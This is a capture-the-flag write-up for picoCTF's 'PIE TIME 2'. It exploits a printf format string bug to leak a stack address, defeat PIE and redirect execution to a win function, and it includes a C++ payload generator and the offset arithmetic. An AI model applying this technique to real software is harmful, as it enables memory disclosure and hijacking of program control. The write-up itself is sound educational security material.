# PIE TIME 2

**Platform:** picoCTF  
**Technique:** Format String Leak + PIE Bypass  
**Difficulty:** Medium  

## Challenge Description

A binary with **PIE (Position Independent Executable)** enabled and a format string vulnerability. No convenient leak this time — we have to find it ourselves.

## Vulnerability

The program uses `printf` directly on user input, creating a format string vulnerability. This allows us to read values from the stack, including addresses within the binary itself.

## Exploitation

### Step 1: Finding the Right Leak Position

Using a custom C++ format string generator to test multiple positions at once:

```cpp
// fmt-generator.cpp
#include<iostream>
using namespace std;

int main(){
    int start, end;
    cout<<"Enter the start: ";
    cin>>start;
    cout<<"Enter the end: ";
    cin>>end;
    for (int i = start; i<=end; i++){
        cout<<"|"<<i<<"=%"<<i<<"$p";
    }
    return 0;
}
```
This generates payloads like |1=%1$p|2=%2$p|3=%3$p... to leak multiple stack positions in one go.

Step 2: Local Testing with Fake Flag
Before attacking the remote, I tested locally with a fake flag file to understand the stack layout. This revealed:

The format string offset (where our input lands)

Which positions contained binary addresses

How to calculate the base from a leak

Step 3: The 8-Byte Mystery
Using AAAA%p.%p... revealed 41414141 at position 8, confirming the stack alignment and helping understand why GDB showed main at +8.

Step 4: Remote Leak
After testing multiple ranges locally, I found that position 19 leaked a binary address:

```text
%19$p  →  leaks main + 0x41
```
Step 5: Calculating Base and win
From readelf and nm:

```text
$ readelf -s vuln | grep win
69: 000000000000136a  150 FUNC    GLOBAL DEFAULT   16 win

$ readelf -s vuln | grep main
65: 0000000000001441  118 FUNC    GLOBAL DEFAULT   16 main
```
The leak at %19$p gave main + 0x41. So:

```python
pie_leak = leaked_address
main_addr = pie_leak - 0x41
pie_base = main_addr - 0x1441   # subtract main's file offset
win_addr = pie_base + 0x136a     # add win's file offset
```
Step 6: Send and Win
The program asks for an address to jump to (ex => 0x12345). Send win_addr and get the flag.
